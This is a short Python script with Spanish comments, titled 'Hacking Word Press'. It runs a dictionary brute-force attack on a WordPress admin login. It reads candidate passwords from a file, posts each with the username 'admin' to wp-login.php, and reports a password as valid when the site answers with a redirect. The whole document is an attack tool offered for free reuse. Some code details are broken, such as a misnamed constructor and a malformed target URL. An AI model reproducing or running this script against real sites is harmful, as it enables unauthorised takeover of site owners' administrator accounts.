#Created on 13/03/2020
#Author: Marco Alvarez M.
#Este programa es de opensource.
#Reconocimiento-NoComercial-CompartirtIgual
#Se puede distribuir y/o modificar siempre y cuando no sean con fines comerciales.


import requests

class hackWP:

    def _init_(self):
        print ("Bienvenidos a Hacking Word Press")    
        
    


    def fuerzabrutaWP(self):
                      
        try:
            
            diccionario = open("dictionary.txt","r") 
            
            for word in diccionario.readlines():
                datos_attack= {
                    'log':'admin',
                    'pwd':word.strip("\n")  
                }
                r = requests.post('http://wordpress//wp-login.php', data=datos_attack, allow_redirects=False)
                if r.status_code in [301,302]:
                    print("Password  "+word+" valido")
                    break
                else:
                    print("Password: "+word+"no Valido")
        
        except Exception as e:
            print e   
     

def main():
    vWP = hackWP()    
    vWP.fuerzabrutaWP()                   
                                     
if __name__ == "__main__":
    main()
